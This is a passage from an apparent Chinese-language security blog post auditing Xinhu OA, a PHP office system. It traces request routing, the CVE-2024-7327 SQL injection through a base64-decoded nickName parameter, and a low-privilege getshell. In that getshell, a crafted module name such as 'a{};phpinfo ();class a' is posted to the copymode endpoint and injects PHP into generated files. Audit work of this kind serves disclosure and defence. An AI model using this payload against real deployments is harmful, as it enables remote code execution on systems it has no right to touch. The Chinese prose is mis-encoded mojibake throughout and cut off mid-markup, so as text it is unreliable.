ä¹ŸçŸ¥é“äº†å…·ä½“æ˜¯æ€ä¹ˆæ‹¼æ¥çš„äº† å¯¹äºä¸‹é¢çš„è¯·æ±‚ï¼š<br><code>POST /index.php?a=check&amp;m=login&amp;d=&amp;ajaxbool=true&amp;rnd=469139 </code><br>è®¿é—®çš„æ˜¯ loginClassAction çš„ checkAction æ–¹æ³•ï¼Œå¹¶ä¸”æ˜¯å¼‚æ­¥è¯·æ±‚ã€‚</p><h2 id="éšä¾¿æ‰¾ä¸ªåŠŸèƒ½ç‚¹"><a href="#éšä¾¿æ‰¾ä¸ªåŠŸèƒ½ç‚¹" class="headerlink" title="éšä¾¿æ‰¾ä¸ªåŠŸèƒ½ç‚¹"></a>éšä¾¿æ‰¾ä¸ªåŠŸèƒ½ç‚¹</h2><p><img src="/2024/10/03/WebSecurity/codeaudit/xinhuoaaudit/image-2.png"><br>ä¿®æ”¹å¯†ç çš„ç‚¹ï¼Œè·Ÿè¿›å»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">editpassAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;systype&#x27;</span>)==<span class="string">&#x27;demo&#x27;</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;æ¼”ç¤ºä¸Šä¸è¦ä¿®æ”¹&#x27;</span>);</span><br><span class="line"><span class="variable">$id</span>= <span class="variable language_">$this</span>-&gt;adminid;</span><br><span class="line"><span class="variable">$oldpass</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passoldPost&#x27;</span>);</span><br><span class="line"><span class="variable">$pasword</span>= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;passwordPost&#x27;</span>);</span><br><span class="line"><span class="variable">$msg</span>= <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;æ–°å¯†ç ä¸èƒ½ä¸ºç©º&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable">$oldpassa</span>= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getmou</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>),<span class="string">&quot;`pass`&quot;</span>,<span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$oldpassa</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$oldpass</span>))<span class="variable">$msg</span> =<span class="string">&#x27;æ—§å¯†ç ä¸æ­£ç¡®&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$oldpassa</span> == <span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>))<span class="variable">$msg</span> =<span class="string">&#x27;æ–°æ—§å¯†ç ä¸èƒ½ç›¸åŒ&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span> == <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">T</span>(<span class="string">&#x27;admin&#x27;</span>), <span class="string">&quot;`pass`=&#x27;&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="variable">$pasword</span>).<span class="string">&quot;&#x27;,`editpass`=`editpass`+1&quot;</span>, <span class="string">&quot;`id`=&#x27;<span class="subst">$id</span>&#x27;&quot;</span>))<span class="variable">$msg</span>= <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">error</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$msg</span>==<span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$msg</span>, <span class="number">201</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¥½åƒæ²¡å•¥èƒ½åˆ©ç”¨çš„ï¼Œä¸»è¦æ˜¯è¾“å…¥ç›´æ¥è¢«md5äº†<br>å†å¤šæµ‹æµ‹çœ‹</p><h2 id="CVE-2024-7327"><a href="#CVE-2024-7327" class="headerlink" title="CVE-2024-7327"></a>CVE-2024-7327</h2><p>è¿˜å¾—æ˜¯å…¬å¼€cve<br>åœ¨ä¿¡å‘¼OAç³»ç»Ÿ2.6.2ç‰ˆæœ¬çš„&#x2F;webmain&#x2F;task&#x2F;openapi&#x2F;openmodhetongAction.phpæ–‡ä»¶ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªå‰å°SQLæ³¨å…¥æ¼æ´ã€‚å½“$nickNameå˜é‡ç»è¿‡base64è§£ç åè¢«åŠ å…¥åˆ°uarræ•°ç»„ä¸­ï¼Œå¹¶æœ€ç»ˆä¼ é€’ç»™$db-&gt;record()æ–¹æ³•è¿›è¡ŒSQLæŸ¥è¯¢æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è¿›è¡ŒSQLæ³¨å…¥æ”»å‡»ã€‚æ­¤å¤–ï¼Œè¿˜éœ€è¦æ³¨æ„çˆ¶ç±»openapiAction.phpä¸­çš„initæ–¹æ³•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">dataAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$mobile</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;mobile&#x27;</span>);</span><br><span class="line">    <span class="variable">$xcytype</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;xcytype&#x27;</span>);</span><br><span class="line">    <span class="variable">$openid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;openid&#x27;</span>);</span><br><span class="line">    <span class="variable">$nickName</span> = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;nickName&#x27;</span>));</span><br><span class="line">    <span class="variable">$htdata</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="variable">$db</span>   = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;wxxcyus&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;mobile&#x27;</span>]   = <span class="variable">$mobile</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;xcytype&#x27;</span>]   = <span class="variable">$xcytype</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;openid&#x27;</span>]   = <span class="variable">$openid</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;nickName&#x27;</span>]   = <span class="variable">$nickName</span>;</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;province&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;province&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;city&#x27;</span>]     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;city&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;gender&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;gender&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;dingyue&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;dingyue&#x27;</span>);</span><br><span class="line">    <span class="variable">$uarr</span>[<span class="string">&#x27;avatarUrl&#x27;</span>]   = <span class="variable language_">$this</span>-&gt;jm-&gt;<span class="title function_ invoke__">base64decode</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="string">&#x27;avatarUrl&#x27;</span>));</span><br><span class="line">    <span class="variable">$where</span> = <span class="string">&quot;`openid`=&#x27;<span class="subst">$openid</span>&#x27;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$db</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="variable">$where</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;adddt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">      <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$uarr</span>[<span class="string">&#x27;optdt&#x27;</span>] = <span class="variable language_">$this</span>-&gt;now;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$uarr</span>, <span class="variable">$where</span>);</span><br></pre></td></tr></table></figure><p>è·Ÿè¿›è¯¥æ–¹æ³• &#x2F;include&#x2F;Model.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$arr</span>, <span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">record</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$arr</span>, <span class="variable">$where</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åˆ°äº† &#x2F;include&#x2F;class&#x2F;mysql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">record</span>(<span class="params"><span class="variable">$table</span>,<span class="variable">$array</span>,<span class="variable">$where</span>=<span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$addbool</span>    = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">isempt</span>(<span class="variable">$where</span>))<span class="variable">$addbool</span>=<span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$cont</span>    = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$array</span>))&#123;</span><br><span class="line">      <span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$key</span>=&gt;<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="variable">$cont</span>.=<span class="string">&quot;,`<span class="subst">$key</span>`=&quot;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">toaddval</span>(<span class="variable">$val</span>).<span class="string">&quot;&quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="title function_ invoke__">substr</span>(<span class="variable">$cont</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$cont</span>  = <span class="variable">$array</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$table</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">gettables</span>(<span class="variable">$table</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$addbool</span>)&#123;</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;insert into <span class="subst">$table</span> set <span class="subst">$cont</span>&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">      <span class="variable">$where</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getwhere</span>(<span class="variable">$where</span>);</span><br><span class="line">      <span class="variable">$sql</span>=<span class="string">&quot;update <span class="subst">$table</span> set <span class="subst">$cont</span> where <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">tranbegin</span>(<span class="variable">$sql</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™é‡Œå¸¦å…¥SQLè¯­å¥æŸ¥è¯¢ å¯¼è‡´æ³¨å…¥ åŒæ—¶è¿˜è¦æ³¨æ„ä¸‹çˆ¶ç±»openapiAction.phpä¸­çš„initæ–¹æ³• è¿™é‡Œçš„Hostéœ€è¦å±äº127.0.0.1 æˆ– 192.168.x.x çš„èŒƒå›´.</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">initAction</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;display= <span class="literal">false</span>;</span><br><span class="line">    <span class="variable">$openkey</span>     = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;openkey   = <span class="title function_ invoke__">getconfig</span>(<span class="string">&#x27;openkey&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;keycheck &amp;&amp; HOST != <span class="string">&#x27;127.0.0.1&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">contain</span>(HOST,<span class="string">&#x27;192.168&#x27;</span>) &amp;&amp; <span class="variable language_">$this</span>-&gt;openkey != <span class="string">&#x27;&#x27;</span>)&#123;</span><br><span class="line">      <span class="keyword">if</span>(<span class="variable">$openkey</span> != <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;openkey))<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">showreturn</span>(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;openkey not access&#x27;</span>, <span class="number">201</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getpostdata</span>();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h2 id="ä¿¡å‘¼OAæ™®é€šç”¨æˆ·æƒé™getshell"><a href="#ä¿¡å‘¼OAæ™®é€šç”¨æˆ·æƒé™getshell" class="headerlink" title="ä¿¡å‘¼OAæ™®é€šç”¨æˆ·æƒé™getshell"></a>ä¿¡å‘¼OAæ™®é€šç”¨æˆ·æƒé™getshell</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php?d=main&amp;m=flow&amp;a=copymode&amp;ajaxbool=true</span><br><span class="line">POST:</span><br><span class="line">id=1&amp;name=a&#123;&#125;;phpinfo ();class a</span><br><span class="line"></span><br><span class="line">ç”Ÿæˆçš„æ–‡ä»¶ï¼š/webmain/flow/input/mode_a%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aAction.php</span><br><span class="line">/webmain/model/flow/2%7B%7D%3Bphpinfo%20%28%29%3Bclass%20aModel.php</span><br><span class="line"></span><br><span class="line">å…¶å®æ˜¯</span><br><span class="line">![](xinhuoaaudit/image-3.png)</span><br></pre></td></tr></table></figure><p>ä»£ç åˆ†æï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*å¤åˆ¶æ¨¡å—</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">copymodeAjax</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="variable">$id</span> = (<span class="keyword">int</span>)<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;id&#x27;</span>,<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"><span class="variable">$bhnu</span> = <span class="title function_ invoke__">strtolower</span>(<span class="title function_ invoke__">trim</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">post</span>(<span class="string">&#x27;name&#x27;</span>)));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">isempt</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;æ–°æ¨¡å—ç¼–å·ä¸èƒ½ä¸ºç©º&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;æ¨¡å—ç¼–å·ä¸èƒ½ç”¨æ•°å­—&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$bhnu</span>)&lt;<span class="number">4</span>)<span class="keyword">return</span> <span class="string">&#x27;ç¼–å·è‡³å°‘è¦4ä½&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">c</span>(<span class="string">&#x27;check&#x27;</span>)-&gt;<span class="title function_ invoke__">isincn</span>(<span class="variable">$bhnu</span>))<span class="keyword">return</span> <span class="string">&#x27;ç¼–å·ä¸èƒ½åŒ…å«ä¸­æ–‡&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$dbs</span> = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;mode&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">rows</span>(<span class="string">&quot;`num`=&#x27;<span class="subst">$bhnu</span>&#x27;&quot;</span>)&gt;<span class="number">0</span>)<span class="keyword">return</span> <span class="string">&#x27;æ¨¡å—ç¼–å·[&#x27;</span>.<span class="variable">$bhnu</span>.<span class="string">&#x27;]å·²å­˜åœ¨&#x27;</span>;</span><br><span class="line"><span class="variable">$mrs</span> = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">getone</span>(<span class="variable">$id</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$mrs</span>)<span class="keyword">return</span> <span class="string">&#x27;æ¨¡å—ä¸å­˜åœ¨&#x27;</span>;</span><br><span class="line"><span class="variable">$ars</span> = <span class="variable">$mrs</span>;</span><br><span class="line"><span class="variable">$name</span>= <span class="variable">$mrs</span>[<span class="string">&#x27;name&#x27;</span>].<span class="string">&#x27;å¤åˆ¶&#x27;</span>;</span><br><span class="line"><span class="variable">$biaom</span>= <span class="variable">$bhnu</span>;</span><br><span class="line"><span class="variable">$obha</span> = <span class="variable">$mrs</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$ars</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;name&#x27;</span>] = <span class="variable">$name</span>;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;num&#x27;</span>]  = <span class="variable">$bhnu</span>;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;table&#x27;</span>]= <span class="variable">$biaom</span>;</span><br><span class="line"><span class="variable">$tablea</span>[] = <span class="variable">$mrs</span>[<span class="string">&#x27;table&#x27;</span>];</span><br><span class="line"><span class="variable">$tables</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">isempt</span>(<span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$staba</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>]);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$staba</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$zb1</span>)&#123;</span><br><span class="line"><span class="variable">$tables</span>.=<span class="string">&#x27;,&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.(<span class="variable">$kz</span>+<span class="number">1</span>).<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">in_array</span>(<span class="variable">$zb1</span>, <span class="variable">$tablea</span>))<span class="variable">$tablea</span>[]=<span class="variable">$zb1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$tables</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$tables</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ars</span>[<span class="string">&#x27;tables&#x27;</span>] = <span class="variable">$tables</span>;</span><br><span class="line"><span class="variable">$modeid</span>  = <span class="variable">$dbs</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$ars</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¤åˆ¶è¡¨</span></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$tablea</span> <span class="keyword">as</span> <span class="variable">$kz</span>=&gt;<span class="variable">$tabs</span>)&#123;</span><br><span class="line"><span class="variable">$sqla</span>    = <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;show create table `[Q]&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>);</span><br><span class="line"><span class="variable">$createsql</span> = <span class="variable">$sqla</span>[<span class="number">0</span>][<span class="string">&#x27;Create Table&#x27;</span>];</span><br><span class="line"><span class="variable">$biaom1</span>   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$kz</span>&gt;<span class="number">0</span>)<span class="variable">$biaom1</span>   = <span class="string">&#x27;&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$biaom</span>.<span class="string">&#x27;zb&#x27;</span>.<span class="variable">$kz</span>.<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$createsql</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;`&#x27;</span>.PREFIX.<span class="string">&#x27;&#x27;</span>.<span class="variable">$tabs</span>.<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;`&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;`&#x27;</span>,<span class="variable">$createsql</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$createsql</span>);</span><br><span class="line"><span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&#x27;alter table `&#x27;</span>.<span class="variable">$biaom1</span>.<span class="string">&#x27;` AUTO_INCREMENT=1&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¤åˆ¶è¡¨å•å…ƒç´ </span></span><br><span class="line"><span class="variable">$db1</span>  = <span class="title function_ invoke__">m</span>(<span class="string">&#x27;flow_element&#x27;</span>);</span><br><span class="line"><span class="variable">$rows</span> = <span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">getall</span>(<span class="string">&#x27;mid=&#x27;</span>.<span class="variable">$id</span>.<span class="string">&#x27;&#x27;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$rows</span> <span class="keyword">as</span> <span class="variable">$k1</span>=&gt;<span class="variable">$rs1</span>)&#123;</span><br><span class="line"><span class="variable">$rs2</span> = <span class="variable">$rs1</span>;</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$rs2</span>[<span class="string">&#x27;id&#x27;</span>]);</span><br><span class="line"><span class="variable">$rs2</span>[<span class="string">&#x27;mid&#x27;</span>] = <span class="variable">$modeid</span>;</span><br><span class="line"><span class="variable">$db1</span>-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$rs2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//å¤åˆ¶ç›¸å…³å¸ƒå±€æ–‡ä»¶</span></span><br><span class="line"><span class="variable">$hurs</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getfiles</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$hurs</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>)&#123;</span><br><span class="line"><span class="variable">$from</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27;&#123;bh&#125;&#x27;</span>,<span class="variable">$obha</span>,<span class="variable">$file</span>);</span><br><span class="line"><span 